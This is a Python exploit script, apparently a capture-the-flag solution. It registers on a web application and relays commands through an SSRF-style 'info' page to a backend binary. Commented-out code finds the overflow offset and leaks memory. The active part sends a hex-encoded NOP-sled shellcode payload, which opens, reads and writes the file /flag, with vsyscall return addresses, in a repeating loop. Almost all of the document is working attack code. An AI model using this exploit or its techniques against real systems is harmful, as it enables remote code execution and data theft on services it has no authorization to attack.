#!/usr/bin/env python
# encoding: utf-8

import requests
import re
import sys
import random
import string
from time import sleep
from pwn import *

r = requests.session()

url = "http://1.1.1.1"
vulurl = "http://0.0.0.0:6000/mutepig.jpg"

reg = "src=\"data:text/html; charset=utf-8;base64,(.*?)\""


def log(txt):
    print ("[+] %s"%txt)

def error(txt):
    print ("[-] %s"%txt)

def weblogin(u, p):
    r.post(url + "login.php", data = {'username': u, 'password': p})

def webregister():
    u = ''.join(random.sample(string.ascii_letters + string.digits, 8))
    r.post(url + "register.php", data = {'username': u, 'password': '1'})
    return u

def one(cmd):
    f = open("cmd.txt", 'w')
    f.write(cmd)
    f.close()
    ct = r.post(url + "index.php?page=info", data = {'url' : vulurl}).content
    try:
        result = re.findall(reg, ct)[0]
        result = result.decode('base64')
    except:
        error("cmd wrong")
        sys.exit(0)
    return result

def binregister():
    u = ''.join(random.sample(string.ascii_letters + string.digits, 8))
    r = one('1 %s %s ' % (u, '1'))
    while '10' not in r:
        r = one('1 %s %s ' % (u, '1'))
    return u

def binlogin(u, p):
    r = one('2 %s %s ' % (u, p))
    return r.split(' ')[1].strip()

def secret(session, ct):
    r = one('4 %s %s' % (session, ct))
    return r

name = webregister()
weblogin(name, '1')

'''
# 1. get overflow offset
for i in xrange(1040, 1070):
    print i, '-'*20
    name = binregister()
    session = binlogin(name, '1')
    print secret(session, '1' * i)
raw_input()
# 2. leak
for i in xrange(1088, 1095):
    print i, '-'*20
    name = binregister()
    session = binlogin(name, '1')
    #print secret(session, '1'*i + p64(0x4010ca))
    ret = secret(session, '1' * i)
    ret = ret.split("\n")[0]
    print ret[i:] ,ret[i:].encode("hex")
'''


# 3. shellcode
pld = "909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909048b801010101010101015048b82e676d6066010101483104244889e76a045a4889d66a02580f054889c731c06a645a4889e60f056a015f6a645a4889e66a01580f0531ff6a3c580f053131313131313131313131000060ffffffffff000060ffffffffff000060ffffffffff000060ffffffffff00".decode("hex")
while True:
    name = binregister()
    session = binlogin(name, '1')
    '''
    sc = shellcraft.amd64.nop() * 980
    sc += shellcraft.amd64.open("/flag", 4, 4)
    sc += shellcraft.amd64.read('rax', 'rsp', 100)
    sc += shellcraft.amd64.write(1, 'rsp', 100)
    sc += shellcraft.amd64.exit(0)
    sc = asm(sc)
    pld = sc + '1' * (1064-len(sc)) + p64(0xffffffffff600000)*4 + '\x00'
    '''
    ct = secret(session, pld)
    print ct
    if 'mutepig' in ct:
        print ct
        input()
    sleep(3)

